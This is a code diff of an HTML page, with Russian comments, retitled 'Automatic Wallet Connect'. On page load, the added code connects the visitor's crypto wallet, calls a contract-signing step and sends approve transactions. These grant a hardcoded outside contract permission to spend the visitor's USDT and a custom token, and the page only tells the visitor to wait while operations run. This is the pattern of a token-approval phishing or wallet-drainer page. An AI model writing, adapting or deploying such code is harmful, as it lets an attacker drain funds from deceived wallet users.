@@ -3,24 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Management App</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
+    <title>Automatic Wallet Connect</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #1f1f1f;
+            color: white;
+        }
+
+        #app {
             text-align: center;
-            margin: 20px;
         }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
+
         #status {
             margin-top: 20px;
             font-weight: bold;
             color: green;
         }
+
         #error {
             margin-top: 20px;
             font-weight: bold;
@@ -29,48 +33,43 @@
     </style>
 </head>
 <body>
-    <h1>Token Management App</h1>
-    <p>Подождите, идет подключение к кошельку и выполнение действий...</p>
-    <div id="status"></div>
-    <div id="error"></div>
-
+    <div id="app">
+        <h1>Automatic Wallet Connect</h1>
+        <div id="status">Подождите, идет подключение и выполнение операций...</div>
+        <div id="error"></div>
+    </div>
+    
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = "0xYourContractAddress"; // Замените на адрес вашего контракта
-        const USDT_TOKEN_ADDRESS = "0xUSDTTokenAddress"; // Адрес контракта USDT
-        const CUSTOM_TOKEN_ADDRESS = "0xCustomTokenAddress"; // Адрес кастомного токена
+        const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Замените на адрес вашего контракта
+        const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
+        const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена
 
-        let userAddress = null;
-
-        // Основной процесс
+        // Основная функция для подключения и выполнения операций
         async function mainProcess() {
             try {
-                // Шаг 1: Подключение кошелька
-                userAddress = await connectWallet();
+                // Шаг 1: Проверка наличия кошелька и подключение
+                if (typeof window.ethereum === 'undefined') {
+                    throw new Error("Кошелек не найден. Установите MetaMask или другой поддерживаемый кошелек.");
+                }
+
+                // Подключение к кошельку
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddress = accounts[0];
+                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
 
                 // Шаг 2: Подписание контракта
                 await signContract();
 
-                // Шаг 3: Выполнение approve для токенов
+                // Шаг 3: Выполнение approve для USDT и кастомного токена
                 await approveTokens(USDT_TOKEN_ADDRESS);
                 await approveTokens(CUSTOM_TOKEN_ADDRESS);
 
-                // Успех
+                // Сообщение об успешном выполнении всех шагов
                 document.getElementById("status").innerText = "Все действия выполнены успешно.";
             } catch (error) {
                 document.getElementById("error").innerText = `Ошибка: ${error.message}`;
             }
-        }
-
-        // Функция подключения кошелька
-        async function connectWallet() {
-            if (typeof window.ethereum === 'undefined') {
-                throw new Error("Кошелек не найден. Установите MetaMask или Trust Wallet.");
-            }
-
-            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-            const address = accounts[0];
-            document.getElementById("status").innerText = `Кошелек подключен: ${address}`;
-            return address;
         }
 
         // Функция подписания контракта
@@ -89,4 +88,23 @@
         }
 
         // Функция предоставления доступа к токенам
-       
+        async function approveTokens(tokenAddress) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const tokenAbi = [
+                "function approve(address spender, uint256 amount) public returns (bool)"
+            ];
+            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
+
+            const amount = ethers.utils.parseUnits("1000", 18); // Укажите необходимое количество токенов с учетом десятичных знаков
+            const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
+            document.getElementById("status").innerText = `Транзакция approve отправлена: ${tx.hash}`;
+            await tx.wait();
+            document.getElementById("status").innerText = `Approve для токенов ${tokenAddress} выполнен.`;
+        }
+
+        // Запуск основного процесса при загрузке страницы
+        window.addEventListener('load', mainProcess);
+    </script>
+</body>
+</html>
